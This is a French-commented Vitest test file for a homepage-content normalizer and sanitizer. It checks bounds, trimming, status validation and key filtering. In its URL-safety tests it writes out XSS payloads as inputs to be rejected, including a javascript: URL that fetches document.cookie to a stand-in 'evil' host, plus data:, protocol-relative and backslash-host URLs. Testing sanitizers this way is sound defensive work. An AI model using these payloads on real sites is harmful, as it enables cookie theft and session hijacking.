import { describe, expect, it } from 'vitest';
import { EMPTY_HOME_CONTENT, normalizeHomeContent, sanitizeHomeContentInput } from './home-content';
import { EXEMPLE_HOME_CONTENT } from './home-seed-exemple';

describe('home-content — normalizeHomeContent', () => {
  it('renvoie une forme COMPLÈTE et vide pour null/undefined', () => {
    expect(normalizeHomeContent(null)).toEqual(EMPTY_HOME_CONTENT);
    expect(normalizeHomeContent(undefined)).toEqual(EMPTY_HOME_CONTENT);
    // Toujours les tableaux (jamais undefined) — le gabarit peut mapper sans garde.
    const n = normalizeHomeContent({});
    expect(Array.isArray(n.stats)).toBe(true);
    expect(Array.isArray(n.espaces)).toBe(true);
    expect(Array.isArray(n.hours.lines)).toBe(true);
  });

  it('borne les statistiques à 4 (spec §2)', () => {
    const content = normalizeHomeContent({
      stats: Array.from({ length: 9 }, (_, i) => ({ value: `${i}`, label: `l${i}` })),
    });
    expect(content.stats).toHaveLength(4);
  });

  it('valide le statut des ressources (valeur inconnue → live)', () => {
    const content = normalizeHomeContent({
      resources: [
        { name: 'A', status: 'maint', statusLabel: 'X' },
        { name: 'B', status: 'n’importe quoi', statusLabel: 'Y' },
      ],
    });
    expect(content.resources[0].status).toBe('maint');
    expect(content.resources[1].status).toBe('live');
  });

  it('trim les chaînes et coerce les types inattendus en vide', () => {
    const content = normalizeHomeContent({
      identity: { fullName: '  BUC  ', acronym: 42, lead: null },
      services: ['  Accueil  ', '', 123, 'Prêt'],
    });
    expect(content.identity.fullName).toBe('BUC');
    expect(content.identity.acronym).toBe(''); // nombre → vide
    expect(content.identity.lead).toBe('');
    // Les entrées vides / non-chaîne sont écartées de la liste des services.
    expect(content.services).toEqual(['Accueil', 'Prêt']);
  });

  it('rejette les schémas d’URL dangereux (XSS), garde http/https ET les relatives same-origin', () => {
    const content = normalizeHomeContent({
      identity: {
        logoUrl: 'javascript:alert(document.cookie)',
        heroImageUrl: 'https://cdn.exemple/hero.jpg',
      },
      resources: [
        { name: 'OK', status: 'live', url: 'https://sudoc.fr' },
        { name: 'JS', status: 'live', url: 'javascript:fetch("//evil?c="+document.cookie)' },
        { name: 'DATA', status: 'live', url: 'data:text/html,<script>alert(1)</script>' },
        { name: 'Relative', status: 'live', url: '/api/x' },
        { name: 'ProtoRel', status: 'live', url: '//evil.com' },
      ],
      contact: {
        socials: [
          { label: 'Bon', url: 'http://facebook.com/buc' },
          { label: 'Piégé', url: 'JavaScript:alert(1)' },
        ],
      },
    });
    // logo javascript: → neutralisé (null) ; image https conservée.
    expect(content.identity.logoUrl).toBeNull();
    expect(content.identity.heroImageUrl).toBe('https://cdn.exemple/hero.jpg');
    // Ressources : http/https absolues ET relatives same-origin survivent ;
    // javascript:/data:/protocol-relative rejetés.
    expect(content.resources.map((r) => r.url)).toEqual([
      'https://sudoc.fr',
      '',
      '',
      '/api/x',
      '',
    ]);
    // Réseaux sociaux : casse du schéma ignorée, javascript: rejeté.
    expect(content.contact.socials.map((s) => s.url)).toEqual([
      'http://facebook.com/buc',
      '',
    ]);
  });

  it('safeUrl (via normalizeHomeContent) : cas requis — relative OK, https OK, javascript/proto-relative KO', () => {
    // Logo/photo hero téléversés → URL relatives same-origin (régression 2026-07-16).
    expect(normalizeHomeContent({ identity: { logoUrl: '/api/x' } }).identity.logoUrl).toBe('/api/x');
    expect(
      normalizeHomeContent({ identity: { logoUrl: '/covers/home/zinda/logo.png' } }).identity.logoUrl,
    ).toBe('/covers/home/zinda/logo.png');
    expect(
      normalizeHomeContent({ identity: { heroImageUrl: 'https://x/hero.jpg' } }).identity.heroImageUrl,
    ).toBe('https://x/hero.jpg');
    // Rejets : javascript:, protocol-relative, backslash-host.
    expect(normalizeHomeContent({ identity: { logoUrl: 'javascript:alert(1)' } }).identity.logoUrl).toBeNull();
    expect(normalizeHomeContent({ identity: { logoUrl: '//evil.com' } }).identity.logoUrl).toBeNull();
    expect(normalizeHomeContent({ identity: { logoUrl: '/\\evil.com' } }).identity.logoUrl).toBeNull();
  });
});

describe('home-content — sanitizeHomeContentInput (écriture)', () => {
  it('écarte les clés inconnues (anti-injection JSON)', () => {
    const clean = sanitizeHomeContentInput({
      identity: { fullName: 'BUC', evil: '<script>' },
      // Section inconnue → absente du résultat.
      hackers: [{ x: 1 }],
    }) as Record<string, unknown>;
    expect((clean.identity as Record<string, unknown>).evil).toBeUndefined();
    expect(clean.hackers).toBeUndefined();
    // Les sections connues restent présentes (forme complète).
    expect(clean.stats).toEqual([]);
  });
});

describe('home-content — seed EXEMPLE', () => {
  it('le contenu EXEMPLE traverse la normalisation sans perte (déjà conforme)', () => {
    // Un aller-retour idempotent : le seed est déjà propre et borné.
    expect(normalizeHomeContent(EXEMPLE_HOME_CONTENT)).toEqual(EXEMPLE_HOME_CONTENT);
    expect(EXEMPLE_HOME_CONTENT.espaces).toHaveLength(7);
    expect(EXEMPLE_HOME_CONTENT.stats).toHaveLength(4);
    expect(EXEMPLE_HOME_CONTENT.services).toHaveLength(5);
  });
});
